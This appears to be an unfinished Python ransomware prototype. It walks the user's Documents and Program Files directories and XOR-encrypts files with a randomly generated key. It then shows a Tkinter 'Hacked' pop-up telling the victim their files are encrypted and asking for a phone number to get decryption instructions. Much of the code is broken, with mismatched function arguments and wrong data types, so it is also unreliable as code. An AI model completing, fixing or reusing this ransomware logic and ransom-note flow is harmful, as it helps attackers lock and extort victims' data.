import os
import shutil
import time
from datetime import datetime
from tkinter import *
from tkinter import messagebox
import random
import string
#from fileX import funcionX

def generate_token():
    token = "".join(random.choices(string.ascii_uppercase + string.ascii_lowercase + string.digits, k=16))
    current_time = datetime.now()
    actual = current_time.strftime("%H:%M:%S %A %d %B %Y")
    #return f"Token: {token}, Time: {actual}"
    return token


"""def token_log(log):
    with open("log.txt", "a") as saves:
        saves.write(f"{log}\n")

if __name__ == "__main__":
    token_entry = generate_token()
    print(f"Generated Token Entry: {token_entry}")

    token_log(token_entry)"""
files_list = []
files_token= {}
for root,dirs,files in os.walk("C:\\Program Files (x86)"):
    for file in files:
        files_token[file]= generate_token()

for file, token in files_token.items():
    print(f"{file}:  {token}")       

user = os.getlogin()
#Change:  user_path = f"C:\Usuarios\{user}", path = os.path.normpath(os.path.join(user_path, directory))
target_directory = os.path.join("C:\\", "Users", user, "Documents")

def walker():
    try:
        print(f"Searching the directory: {target_directory}")
            #os.path.isdir is useful to make sure the directory exist
        if not os.path.isdir(target_directory):
            print(f"El directory doesn't exist {target_directory}.") 
        for root, dirs, files in os.walk(target_directory):
            #Backup function
            #Print the current directory
            print(f"Current directory: {root}")
            #If is because we have to verify if there any subdirecories in it
            if dirs:
                #Print all the subdirectories found in the target_directory and separate them by commas
                print(f"Subdirectories: {','.join(dirs)}")
            #Again If is because we have to verify if there any file in it
            if files:
                print(f"Files: {','.join(files)}")
            break
    #Exception Error        
    except Exception as e:
        print(f"Error trying to find directory: {e}")
#Call the function
walker(target_directory)

source = r"C:\Users\...\Documents\new_folder"
destination = r"C:\Users\...\Desktop\Test"

def backup_with_validation(source, destination):
 
    if not os.path.exists(source):
        print(f"Error: the route source doesnt exists: {source}")
        return
    if not os.path.exists(destination):
        print(f"This route destination doesn't exists. {destination}")
        os.makedirs(destination)
        

    try:
       
        print("|--- INICIATING BACKUP ---|")
        for file in os.listdir(source):
            src_file = os.path.join(source, file)
            dst_file = os.path.join(destination, file)
            shutil.copy2(src_file, dst_file)
            print(f"Copied file: {file} -> {destination}")
        print("|--- BACKUP COMPLETED ---|")
    except Exception as e:
        print(f"Error during backup: {e}")


backup_with_validation(source, destination)

log_data = generate_token()

key = log_data['Token']
print(f"Generated key >> {key}")

enc_name = input("Enter name of the file to encrypt:")

def xor_encrypt(path,key):
    for root,dirs,files in os.walk(path) :
        for file in files :
            with open (file,"rb") as cfile :
                try:
                    with open(enc_name,'rb') as file:
                        data = file.read()

                    key_bytes = bytearray(key, 'utf-8')
                    encrypted_data = bytearray()
                    for i, byte in enumerate(data):
                    #print(i,byte)
                        encrypted_data.append(byte ^ key_bytes[i % len(key_bytes)])

                    with open(enc_name, 'wb') as encrypted:
                        encrypted.write(encrypted_data)
                except FileNotFoundError:
                    print("Error: File not found")

xaa = xor_encrypt(key)
print("File successfully encrypted")

decrypt_key = input("Enter decryption key:")
filename = input("Enter name of file to decrypt:")

def xor_decrypt(filename,decrypt_key):
    try:
        with open(filename,'rb') as file:
            encrypted_data = file.read()
        key_bytes = bytearray(key,'utf-8')
        decrypted_data = bytearray()
        for i,byte in enumerate(encrypted_data):
            decrypted_data.append(byte ^ key_bytes[i % len(key_bytes)])
        with open(filename[:-4],'wb') as decrypt:
            decrypt.write(decrypted_data)
    except FileNotFoundError:
        print("Error: file not found")

xor_decrypt(filename,decrypt_key)


"""def log_token(log_data):
    with open('log_token.txt', "a") as save:
        save.write(f"\n{log_data}")

log_token(log_data)
"""

"""def read_token():
    try:
        with open('log_token.txt','r') as token:
            content = token.readlines()
            print(content[0::],type(content[1]))

                
                
    except FileNotFoundError :
        print("ERROR : File not found")



read_token()"""

def check_file_exists():
    file_name = "alargar_pene.txt"
    downloads_dir = os.path.expanduser("~/Downloads")
    file_path = os.path.join(downloads_dir, file_name)
    if os.path.exists(file_path):
        messagebox.showerror("Hacked", "Your files have been hacked and encrypted. Please enter your phone number to get decryption instructions.")
        phone_label = Label(root, text="Enter your phone number:")
        phone_label.pack()
        phone_entry = Entry(root)
        phone_entry.pack()
        submit_button = Button(root, text="Submit", command=lambda: submit_phone_number(phone_entry, root))
        submit_button.pack()

def submit_phone_number():
    phone_number = phone_entry.get()
    # Simulate sending the phone number to a server or processing it
    messagebox.showinfo("THANKS", "Thank you for entering your phone number. We will contact you shortly.")
    phone_entry.delete(0, END)

root = Tk()
root.title("File Encryption")



root.mainloop()
# Main script
if __name__ == "__main__":
    user = os.getlogin()
    target_directory = os.path.join("C:\\", "Users", user, "Documents")
    walker(target_directory)

    source = r"C:\Users\...\Documents\new_folder"
    destination = r"C:\Users\...\Desktop\Test"
    backup_with_validation(source, destination)

    token, actual = generate_token()
    token_log(f"{actual} - {token}")

    with open(enc_name, 'rb') as file:
        data = file.read()
    encrypted_data = xor_encrypt(data, token)
    with open(enc_name, 'wb') as encrypted:
        encrypted.write(encrypted_data)
    print("File successfully encrypted")

    decrypted_data = xor_decrypt(encrypted_data, token)
    with open(filename[:-4], 'wb') as decrypt:
        decrypt.write(decrypted_data)

    root = Tk()
    root.title("File Encryption")
    check_file_exists(root)
    root.mainloop()
    phone_entry = Entry(root)  # Initialize the Entry widget
    check_file_exists()